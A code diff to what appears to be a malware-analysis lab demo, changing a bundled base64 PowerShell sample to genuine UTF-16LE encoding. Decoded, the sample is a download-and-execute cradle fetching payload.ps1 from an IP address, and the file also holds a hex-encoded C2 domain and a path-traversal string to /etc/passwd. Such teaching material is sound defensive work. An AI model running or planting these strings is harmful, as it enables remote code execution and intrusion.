@@ -24,8 +24,12 @@ DATA_DIR = Path("/lab/data") if Path("/lab/data").exists() else Path("data")
 DIVIDER = "─" * 64
 
 # Bundled artifacts (duplicated here so demo runs without reading the file)
-PS_B64 = ("aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw"
-          "Oi8vMTg1LjIyMC4xMDEuNDcvcGF5bG9hZC5wczEnKQ==")
+# Genuine PowerShell -enc: the command is UTF-16LE before base64 (as Windows
+# encodes it), so decoding needs `.decode("utf-16-le")` / `iconv -f utf-16le`.
+PS_B64 = ("aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA"
+          "bABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgA"
+          "dAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AcABhAHkA"
+          "bABvAGEAZAAuAHAAcwAxACcAKQA=")
 HEX_C2 = "63646e2d7570646174652e6578616d706c65"  # decodes to cdn-update.example
 URL_TRAV = "%2F..%2F..%2F..%2Fetc%2Fpasswd"
 
